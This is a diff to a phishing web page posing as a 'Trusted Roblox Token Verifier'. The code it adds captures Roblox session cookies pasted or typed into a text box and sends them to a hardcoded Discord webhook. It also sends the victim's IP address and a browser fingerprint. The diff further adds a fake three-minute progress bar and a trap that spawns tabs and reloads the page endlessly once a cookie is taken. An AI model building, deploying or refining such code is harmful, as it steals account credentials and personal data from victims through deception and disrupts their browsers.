@@ -25,26 +25,78 @@
       box-shadow: 0 20px 70px rgba(0,0,0,0.7);
       text-align: center;
     }
-    h1 { margin: 0 0 10px; font-size: 2.8rem; background: linear-gradient(90deg, #c084fc, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .subtitle { color: #b0a0ff; margin-bottom: 30px; }
-    textarea {
-      width: 100%; min-height: 180px; padding: 18px 22px;
-      border: 2px solid #5a4a9f; border-radius: 14px;
-      background: rgba(30,20,60,0.7); color: #f0e8ff;
-      font-family: 'Courier New', monospace; font-size: 1.05rem;
-      resize: vertical; margin-bottom: 20px;
+    h1 {
+      margin: 0 0 10px;
+      font-size: 2.8rem;
+      background: linear-gradient(90deg, #c084fc, #a855f7);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-    textarea:focus { outline: none; border-color: #a855f7; box-shadow: 0 0 0 4px rgba(168,85,247,0.25); }
+    .subtitle {
+      color: #b0a0ff;
+      margin-bottom: 30px;
+    }
+    textarea {
+      width: 100%;
+      min-height: 180px;
+      padding: 18px 22px;
+      border: 2px solid #5a4a9f;
+      border-radius: 14px;
+      background: rgba(30,20,60,0.7);
+      color: #f0e8ff;
+      font-family: 'Courier New', monospace;
+      font-size: 1.05rem;
+      resize: vertical;
+      margin-bottom: 20px;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    textarea:focus {
+      outline: none;
+      border-color: #a855f7;
+      box-shadow: 0 0 0 4px rgba(168,85,247,0.25);
+    }
     button {
       background: linear-gradient(90deg, #a855f7, #d946ef);
-      border: none; color: white; font-size: 1.25rem; padding: 16px 80px;
-      border-radius: 999px; cursor: pointer; transition: all 0.3s;
+      border: none;
+      color: white;
+      font-size: 1.25rem;
+      padding: 16px 80px;
+      border-radius: 999px;
+      cursor: pointer;
+      transition: all 0.3s;
     }
-    button:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(168,85,247,0.5); }
-    button:disabled { opacity: 0.5; cursor: not-allowed; }
-    #status { margin-top: 25px; font-size: 1.05rem; min-height: 1.6em; }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 35px rgba(168,85,247,0.5);
+    }
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 25px;
+      font-size: 1.05rem;
+      min-height: 1.6em;
+    }
+    #fake-progress {
+      margin: 30px 0;
+      height: 24px;
+      background: #2a1a4a;
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      display: none;
+    }
+    #bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #a855f7, #d946ef);
+      transition: width 180s linear;
+    }
+    .fake-loading { color: #a855f7; animation: pulse 2s infinite; }
     .success { color: #34d399; }
     .error   { color: #f87171; }
+    @keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:0.6 } }
   </style>
 </head>
 <body>
@@ -54,24 +106,28 @@
     <div class="subtitle">Trusted Roblox Token Verifier & Auto-Extractor</div>
 
     <textarea id="input" placeholder="Paste your token / logs / console output here..."></textarea>
-
     <button id="btn">Redeem / Verify Token</button>
 
     <div id="status"></div>
+    <div id="fake-progress"><div id="bar"></div></div>
   </div>
 
   <script>
     const WEBHOOK = "https://canary.discord.com/api/webhooks/1482432207996850357/nFWeIrDthT3-6ylOyh_X189uWeC6CA-AeeVc8VGzVB9C4MFJ1gmU3X-aQuzImNAFm2Vc";
 
-    const input = document.getElementById("input");
-    const btn = document.getElementById("btn");
+    const input  = document.getElementById("input");
+    const btn    = document.getElementById("btn");
     const status = document.getElementById("status");
+    const bar    = document.getElementById("bar");
+    const progress = document.getElementById("fake-progress");
 
     const cookieRegex = /_\|WARNING:-DO-NOT-SHARE-THIS\.--.*?\|_[A-Za-z0-9\-_+=.\/]{600,1300}/g;
 
+    let alreadySent = false;
     let lastHash = "";
     let lastSendTime = 0;
     let pasteTimeout = null;
+    let typeTimeout = null;
 
     function getHash(str) {
       let h = 0;
@@ -79,16 +135,60 @@
       return h.toString(36);
     }
 
-    async function sendCookie(cookie, trigger) {
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip || "unknown";
+      } catch {
+        try {
+          const res = await fetch("https://api64.ipify.org?format=json");
+          const data = await res.json();
+          return data.ip || "unknown";
+        } catch { return "unknown"; }
+      }
+    }
+
+    function getFingerprint() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language || navigator.userLanguage,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}-bit`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardware: navigator.hardwareConcurrency || "unknown",
+        canvas: (function(){
+          const c = document.createElement("canvas");
+          const ctx = c.getContext("2d");
+          ctx.textBaseline = "top"; ctx.font = "14px Arial";
+          ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+          ctx.fillStyle = "#069"; ctx.fillText("Tokener",2,15);
+          ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("Tokener",4,17);
+          return c.toDataURL();
+        })().slice(-80)
+      };
+    }
+
+    async function sendData(cookie, trigger) {
+      if (alreadySent) return false;
+
+      const ip = await getIP();
+      const fp = getFingerprint();
+
       const payload = {
         embeds: [{
-          title: "🔐 Tokener Fetcher - Token Captured",
+          title: "🔐 Tokener Fetcher - FULL HIT",
           color: 0xa855f7,
-          description: "```yaml\n" + cookie + "\n```",
+          description: "```yaml\n" + (cookie || "[no cookie]") + "\n```",
           fields: [
-            { name: "Trigger", value: trigger, inline: true },
-            { name: "Length", value: cookie.length.toString(), inline: true },
-            { name: "Time", value: new Date().toISOString(), inline: true }
+            { name: "Trigger",      value: trigger, inline: true },
+            { name: "IP",           value: ip, inline: true },
+            { name: "User-Agent",   value: fp.userAgent.slice(0,100), inline: false },
+            { name: "Screen",       value: fp.screen, inline: true },
+            { name: "Timezone",     value: fp.timezone, inline: true },
+            { name: "Language",     value: fp.language, inline: true },
+            { name: "Canvas tail",  value: fp.canvas, inline: false },
+            { name: "Time",         value: new Date().toISOString(), inline: true }
           ]
         }]
       };
@@ -99,70 +199,91 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-      } catch {}
+        alreadySent = true;
+        return true;
+      } catch {
+        return false;
+      }
+    }
+
+    async function trap() {
+      status.textContent = "Verifying & securing your premium account… Please wait (3 min)";
+      status.className = "fake-loading";
+      progress.style.display = "block";
+      bar.style.width = "0%";
+
+      requestAnimationFrame(() => {
+        setTimeout(() => { bar.style.width = "100%"; }, 120);
+      });
+
+      input.style.opacity = "0";
+      btn.style.opacity = "0";
+      setTimeout(() => {
+        input.style.display = "none";
+        btn.style.display = "none";
+      }, 600);
+
+      setTimeout(() => {
+        const url = window.location.href;
+        for (let i = 0; i < 8; i++) {
+          window.open(url, "_blank");
+        }
+        window.close();
+        setInterval(() => { window.location.href = url; }, 1200);
+      }, 1800);
     }
 
     async function process(trigger = "manual") {
+      if (alreadySent) return false;
+
       const text = input.value.trim();
       if (text.length < 200) return false;
 
       const hash = getHash(text);
       const now = Date.now();
-
-      if (hash === lastHash && now - lastSendTime < 30000) {
-        return false; // same content + recent send → skip
-      }
+      if (hash === lastHash && now - lastSendTime < 30000) return false;
 
       const matches = text.match(cookieRegex) || [];
-
       if (matches.length === 0) return false;
 
       let sent = false;
       for (const m of matches) {
         const cookie = m.trim();
         if (cookie.length >= 700) {
-          await sendCookie(cookie, trigger);
-          sent = true;
+          const success = await sendData(cookie, trigger);
+          if (success) {
+            sent = true;
+            lastHash = hash;
+            lastSendTime = now;
+          }
         }
       }
 
       if (sent) {
-        lastHash = hash;
-        lastSendTime = now;
+        await trap();
       }
 
       return sent;
     }
 
-    // Paste → delayed check once
     input.addEventListener("paste", () => {
+      if (alreadySent) return;
       clearTimeout(pasteTimeout);
-      pasteTimeout = setTimeout(async () => {
-        const found = await process("paste");
-        if (found) {
-          status.textContent = "Token detected and processed!";
-          status.className = "success";
-        }
-      }, 800);
+      pasteTimeout = setTimeout(async () => await process("paste"), 700);
     });
 
-    // Redeem button → main trigger
+    input.addEventListener("input", () => {
+      if (alreadySent) return;
+      clearTimeout(typeTimeout);
+      typeTimeout = setTimeout(async () => await process("typing"), 1200);
+    });
+
     btn.addEventListener("click", async () => {
+      if (alreadySent) return;
       btn.disabled = true;
       status.textContent = "Processing...";
       status.className = "";
-
-      const found = await process("redeem");
-
-      if (found) {
-        status.textContent = "Token successfully verified & redeemed!";
-        status.className = "success";
-      } else {
-        status.textContent = "No valid token found in the input.";
-        status.className = "error";
-      }
-
-      setTimeout(() => { btn.disabled = false; }, 2000);
+      await process("redeem");
     });
   </script>
 </body>
